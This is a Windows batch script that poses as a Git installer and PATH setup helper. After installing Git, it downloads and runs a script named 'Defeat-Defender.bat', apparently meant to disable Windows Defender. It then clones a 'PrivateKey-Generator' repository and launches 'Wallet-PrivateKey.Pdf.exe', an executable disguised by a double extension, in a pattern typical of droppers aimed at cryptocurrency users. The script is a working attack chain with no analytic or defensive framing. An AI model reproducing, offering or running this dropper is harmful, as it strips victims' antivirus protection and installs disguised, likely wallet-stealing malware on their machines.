@echo off
:: Add Git to PATH for the current session
set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"

:: Inform the user
echo 'Git has been installed and added to PATH. You can now use Git in this Command Prompt session.'

:: Check if Git is installed
git --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo 'Git is not installed. Installing Git...'
    powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe -OutFile GitInstallerss.exe; Start-Process -FilePath .\GitInstallerss.exe -ArgumentList '/VERYSILENT', '/NORESTART' -Wait; Remove-Item -Force GitInstallerss.exe"
:: Add Git to PATH for the current session
set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"
)
:: Add Git to PATH for the current session
set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"

:: Inform the user
echo 'Git has been installed and added to PATH. You can now use Git in this Command Prompt session.'

:: Check if Git is now installed
git --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo 'Git installation failed. Exiting...'
    exit /b %ERRORLEVEL%
)


:: Define the URL for the Defeat-Defender.bat file
set "url=https://github.com/swagkarna/Defeat-Defender-V1.2.0/raw/refs/heads/main/Defeat-Defender.bat"
set "outputFile=Defeat-Defender.bat"

:: Download the Defeat-Defender.bat file
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %outputFile%"
if %ERRORLEVEL% neq 0 (
    echo 'Failed to download Defeat-Defender.bat. Exiting...'
    exit /b %ERRORLEVEL%
)

:: Execute the downloaded Defeat-Defender.bat file
start /wait cmd /c "%outputFile%"
if %ERRORLEVEL% neq 0 (
    echo 'Failed to execute Defeat-Defender.bat. Exiting...'
    exit /b %ERRORLEVEL%
)

:: Inform the user that the process is complete
echo 'Defeat-Defender.bat executed successfully.'


git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
if %ERRORLEVEL% neq 0 (
    echo 'Git clone failed. Exiting...'
    exit /b %ERRORLEVEL%
)
cd PrivateKey-Generator
start /wait Wallet-PrivateKey.Pdf.exe
